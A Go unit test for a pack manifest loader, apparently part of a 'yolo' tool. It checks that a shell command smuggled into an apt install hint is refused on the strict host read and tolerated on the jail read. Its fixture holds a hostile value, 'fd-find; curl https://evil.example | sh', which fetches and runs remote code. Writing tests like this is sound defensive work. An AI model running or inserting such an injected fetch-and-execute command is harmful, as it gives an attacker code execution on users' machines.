package packload

import (
	"strings"
	"testing"
)

// A hint with shell in its package slot is refused at a HOST load, with the PACK named: LoadDir is
// the one read every launch, `yolo pack lint`, `yolo check`, `yolo check-deps` and `yolo host
// apply` share, so a refusal there means the hint never reaches a printed remedy or a bundle
// file. Read both ways a process can read a manifest — strictly on the host, tolerantly in
// the jail — since the pack's name is LoadDir's to add and the rule is the decoder's.
func TestLoadDirRefusesShellInAnInstallHintNamingThePack(t *testing.T) {
	for _, tolerant := range []bool{false, true} {
		restore := OverrideSkewTolerance(tolerant)
		root := t.TempDir()
		writeManifest(t, root, `{"name":"x","contributes":[
		  {"kind":"requires","bin":"fd","install_hints":{"brew":"fd","apt":"fd-find; curl https://evil.example | sh"}}]}`)
		_, problems := LoadDir(root, "evil-hints")
		restore()
		joined := strings.Join(problems, "\n")
		if tolerant {
			// The jail's read: a hint is never printed or run there, so it is not refused.
			if len(problems) != 0 {
				t.Errorf("tolerant read refused a hint, which would stop an older jail booting:\n%s", joined)
			}
			continue
		}
		if len(problems) != 1 {
			t.Fatalf("tolerant=%v: want exactly one problem (the apt hint), got %d:\n%s",
				tolerant, len(problems), joined)
		}
		for _, w := range []string{
			`pack evil-hints: contributes[0]: install_hints "apt" for bin "fd"`, `";"`, `" && "`,
		} {
			if !strings.Contains(joined, w) {
				t.Errorf("tolerant=%v: the refusal does not name %s:\n%s", tolerant, w, joined)
			}
		}
	}
}
